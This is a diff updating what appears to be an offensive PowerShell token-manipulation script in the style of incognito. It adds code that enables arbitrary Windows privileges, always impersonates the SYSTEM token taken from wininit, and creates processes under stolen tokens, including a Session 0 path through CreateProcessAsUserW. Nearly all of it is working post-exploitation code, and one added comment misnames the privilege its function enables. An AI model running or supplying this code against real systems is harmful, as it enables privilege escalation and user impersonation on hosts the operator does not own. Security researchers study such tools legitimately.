@@ -23,6 +23,11 @@ so I created the NoUI flag. ALSO: When creating a process, the script will reque
 This could show up in logs depending on the level of monitoring.
 
 
+PERMISSIONS REQUIRED:
+SeSecurityPrivilege: Needed if launching a process with a UI that needs to be rendered. Using the -NoUI flag blocks this.
+SeAssignPrimaryTokenPrivilege : Needed if launching a process while the script is running in Session 0.
+
+
 Important differences from incognito:
 First of all, you should probably read the incognito white paper to understand what incognito does. If you use incognito, you'll notice it differentiates
 between "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a service
@@ -44,7 +49,7 @@ Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
-Version: 1.0
+Version: 1.1
 
 .DESCRIPTION
 
@@ -730,8 +735,8 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 	}
 
 
-    #Enable SeSecurityPrivilege, needed to query security information for desktop DACL
-    function Enable-SeSecurityPrivilege
+    #Enable SeAssignPrimaryTokenPrivilege, needed to query security information for desktop DACL
+    function Enable-SeAssignPrimaryTokenPrivilege
     {	
 	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
 	    if ($ThreadHandle -eq [IntPtr]::Zero)
@@ -772,7 +777,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
         [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
 
-	    $Result = $LookupPrivilegeValue.Invoke($null, "SeSecurityPrivilege", [Ref] $LuidObject)
+	    $Result = $LookupPrivilegeValue.Invoke($null, "SeAssignPrimaryTokenPrivilege", [Ref] $LuidObject)
 
 	    if ($Result -eq $false)
 	    {
@@ -806,10 +811,102 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     }
 
 
+    #Enable SeSecurityPrivilege, needed to query security information for desktop DACL
+    function Enable-Privilege
+    {
+        Param(
+            [Parameter()]
+            [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
+                "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
+                "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
+                "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
+                "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
+                "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
+                "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
+                "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
+            [String]
+            $Privilege
+        )
+
+	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
+	    if ($ThreadHandle -eq [IntPtr]::Zero)
+	    {
+		    Throw "Unable to get the handle to the current thread"
+	    }
+		
+	    [IntPtr]$ThreadToken = [IntPtr]::Zero
+	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+	    if ($Result -eq $false)
+	    {
+		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
+		    {
+			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
+			    if ($Result -eq $false)
+			    {
+				    Throw (New-Object ComponentModel.Win32Exception)
+			    }
+				
+			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+			    if ($Result -eq $false)
+			    {
+				    Throw (New-Object ComponentModel.Win32Exception)
+			    }
+		    }
+		    else
+		    {
+			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
+		    }
+	    }
+
+        $CloseHandle.Invoke($ThreadHandle) | Out-Null
+	
+        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
+        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
+        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
+
+	    $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)
+
+	    if ($Result -eq $false)
+	    {
+		    Throw (New-Object ComponentModel.Win32Exception)
+	    }
+
+        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
+        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
+        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)
+
+        $LuidAndAttributes.Luid = $LuidObject
+        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
+
+        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
+        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
+        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
+	    $TokenPrivileges.PrivilegeCount = 1
+	    $TokenPrivileges.Privileges = $LuidAndAttributes
+
+        $Global:TokenPriv = $TokenPrivileges
+
+        Write-Verbose "Attempting to enable privilege: $Privilege"
+	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
+	    if ($Result -eq $false)
+	    {
+            Throw (New-Object ComponentModel.Win32Exception)
+	    }
+
+        $CloseHandle.Invoke($ThreadToken) | Out-Null
+        Write-Verbose "Enabled privilege: $Privilege"
+    }
+
+
     #Change the ACL of the WindowStation and Desktop
     function Set-DesktopACLs
     {
-        Enable-SeSecurityPrivilege
+        Enable-Privilege -Privilege SeSecurityPrivilege
 
         #Change the privilege for the current window station to allow full privilege for all users
         $WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("WinSta0")
@@ -1454,7 +1551,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             [String]
             $ProcessArgs
         )
-
+        Write-Verbose "Entering Create-ProcessWithToken"
         #Duplicate the token so it can be used to create a new process
         [IntPtr]$NewHToken = [IntPtr]::Zero
         $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
@@ -1473,14 +1570,30 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
             [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)
 
-            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProcessName)
+            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$ProcessName")
             $ProcessArgsPtr = [IntPtr]::Zero
             if (-not [String]::IsNullOrEmpty($ProcessArgs))
             {
-                $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProcessArgs)
+                $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$ProcessName`" $ProcessArgs")
             }
-
-            $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
+            
+            $FunctionName = ""
+            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
+            {
+                #Cannot use CreateProcessWithTokenW when in Session0 because CreateProcessWithTokenW throws an ACCESS_DENIED error. I believe it is because
+                #this API attempts to modify the desktop ACL. I would just use this API all the time, but it requires that I enable SeAssignPrimaryTokenPrivilege
+                #which is not ideal. 
+                Write-Verbose "Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token."
+                Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
+                $Success = $CreateProcessAsUserW.Invoke($NewHToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
+                $FunctionName = "CreateProcessAsUserW"
+            }
+            else
+            {
+                Write-Verbose "Not running in Session 0, calling CreateProcessWithTokenW to create a process with alternate token."
+                $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
+                $FunctionName = "CreateProcessWithTokenW"
+            }
             if ($Success)
             {
                 #Free the handles returned in the ProcessInfo structure
@@ -1491,7 +1604,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             else
             {
                 $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                Write-Warning "CreateProcessWithTokenW failed. Error code: $ErrorCode"
+                Write-Warning "$FunctionName failed. Error code: $ErrorCode"
             }
 
             #Free StartupInfo memory and ProcessInfo memory
@@ -1540,20 +1653,18 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     {
         $AllTokens = @()
 
-        if ([Environment]::UserName -ine "SYSTEM")
+        #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
+        #Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges, so impersonate the wininit token.
+        $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
+        if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
         {
-            #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
-            $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
-            if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
-            {
-                Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
-            }
+            Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
+        }
 
-            if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
-            {
-                $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
-                $systemTokenInfo = $null
-            }
+        if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
+        {
+            $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
+            $systemTokenInfo = $null
         }
 
         $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}
@@ -1639,7 +1750,12 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             Write-Error "Script must be run as administrator" -ErrorAction Stop
         }
 
-        $OriginalUser = [Environment]::UserName
+        #If running in session 0, force NoUI
+        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
+        {
+            Write-Verbose "Running in Session 0, forcing NoUI (processes in Session 0 cannot have a UI)"
+            $NoUI = $true
+        }
 
         if ($PsCmdlet.ParameterSetName -ieq "RevToSelf")
         {
@@ -1727,10 +1843,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 
                 Create-ProcessWithToken -hToken $hToken -ProcessName $CreateProcess -ProcessArgs $ProcessArgs
 
-                if ($OriginalUser -ine "SYSTEM")
-                {
-                    Invoke-RevertToSelf
-                }
+                Invoke-RevertToSelf
             }
             elseif ($ImpersonateUser)
             {
@@ -1757,10 +1870,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                 Write-Output (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser.Values
             }
 
-            if ($OriginalUser -ine "SYSTEM")
-            {
-                Invoke-RevertToSelf
-            }
+            Invoke-RevertToSelf
 
             Free-AllTokens -TokenInfoObjs $AllTokens
         }
